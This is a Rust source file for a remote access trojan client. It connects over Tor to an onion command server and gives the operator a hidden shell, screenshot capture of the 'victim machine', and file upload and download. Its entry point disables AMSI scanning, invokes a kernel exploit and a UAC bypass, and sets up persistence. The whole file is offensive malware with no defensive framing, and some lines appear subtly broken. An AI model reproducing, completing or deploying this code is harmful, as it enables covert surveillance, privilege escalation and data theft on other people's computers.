#[cfg(target_os = "windows")]
mod uac_bypass;
#[cfg(target_os = "windows")]
mod amsi_patch;
#[cfg(target_os = "windows")]
mod kernel_exploit;
#[cfg(target_os = "windows")]
mod persist;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;

use arti_client::{TorClient, TorClientConfig, DataStream};
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
use rand::Rng;
use std::fs;
use std::path::{Path, Prefix};
use base64::{engine::general_purpose, Engine as _};
use screenshots::Screen;


#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn get_onion_host() -> String {
    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
}

#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}


impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: get_onion_host(),
            port: 1337,
        }
    }
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfig::default();
    let client = TorClient::create_bootstrapped(config).await?;
    println!("Initialized Tor Client");
    Ok(client)
}

fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    let image = screen.capture()?;

    let mut buf = Vec::new();
    image.write_to(&mut buf, image::ImageOutputFormat::Png)?;

    Ok(general_purpose::STANDARD.encode(buf)())
}

/// Build prompt string
pub fn build_prompt() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());

    let host = gethostname()
        .into_string()
        .unwrap_or_else(|_| "host".into());

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!("{}@{} [{}] >> ", user, host, cwd)
}


/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        "help" | "/h"|"/?" |"" => {
            Ok(format!("

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `uac [exe_path]`=>\tRun elevated command on Windows

    ").into_bytes())
        }
        "screenshot" => {
            let filename = args
                .get(0)
                .ok_or_else(|| anyhow!("Missing filename"))?;

            if filename.into_string() == ""{
                let encoded = take_screenshot_base64()?;
                Ok(format!("[file] screenshot.png {}", encoded).into_bytes())
            }else{
                let encoded = take_screenshot_base64()?;
                Ok(format!("[file] {} {}",filename.into_string(), encoded).into_bytes())
            }
        }
        "upload" => {
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("upload: missing filename"))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!("invalid filename"))?;

            Ok(format!(
                "[file] {} {}",
                filename,
                general_purpose::STANDARD.encode(&data)
            )
            .into_bytes())
        }
        "download" | "[file][" => {
            
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("download: missing filename"))?;

            let encoded = args
                .get(1)
                .ok_or_else(|| anyhow!("download: missing data"))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("Wrote data to {}", input_filename).into_bytes())
        }
        "cd" => {
            let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
                }
                Err(e) => {
                    Ok(format!("cd error: {}\n", e).into_bytes())
                }
            }
        }

        "uac" => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac: missing argument\n".to_vec());
                }

                let payload = args.join(" ");
                crate::uac_bypass::elevate_uac(&payload);

                Ok(format!("Triggered UAC with payload: {}\n", payload).into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac not supported on this OS\n".to_vec())
            }
        }

        "exit" | "quit" | "/quit" => {
            std::process::exit(0);
        }

        _ => {
            #[cfg(target_os = "windows")]
            let mut command = {
                let mut c = Command::new("cmd.exe");
                c.arg("/C")
                    .arg(input)
                    .creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(not(target_os = "windows"))]
            let mut command = {
                let mut c = Command::new("/bin/sh");
                c.arg("-c").arg(input);
                c
            };

            let output = command.output().await?;

            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(b"(no output)\n");
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        }
    }
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop
pub async fn read_loop(stream: DataStream) -> Result<()> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 4096];
    let mut buffer = String::new();

    writer.write_all(build_prompt().as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("Connection closed by remote");
            break;
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.is_empty() {
                writer.write_all(build_prompt().as_bytes()).await?;
                writer.flush().await?;
                continue;
            }

            let output = run_command(&line).await?;
            writer.write_all(&output).await?;

            writer.write_all(build_prompt().as_bytes()).await?;
            writer.flush().await?;
        }
    }

    Ok(())
}

/// Core runner
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("Attempting to connect...");

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("Connected to onion service");

                if let Err(e) = read_loop(stream).await {
                    println!("Session error: {}", e);
                }

                println!("Connection closed, will reconnect...");
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }

        let delay: u64 = rand::thread_rng().gen_range(19..=67);

        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
}

#[unsafe(no_mangle)]
#[unsafe(export_name = "netclient")]
pub async extern "C" fn netclient()-> Result<()>{
    #[cfg(target_os = "windows")]
    amsi_patch::amsi_patch();

    #[cfg(target_os = "windows")]
    let exe_path = env::current_exe()?;

    #[cfg(target_os = "windows")]
    let exe_str = exe_path.to_string_lossy().to_string();

    #[cfg(target_os = "windows")]
    if !is_elevated() {
        unsafe {
            kernel_exploit::exploit();
        }
        uac_bypass::elevate_uac(&exe_str);
        return Ok(());
    } 
    #[cfg(target_os = "windows")]
    persist::persist()?;
    #[cfg(target_os = "windows")]
    if !is_elevated(){
        sleep(Duration::from_secs(61)).await;
    }
    netclient_run(ClientConfig::default()).await?;
    return Ok(());
}
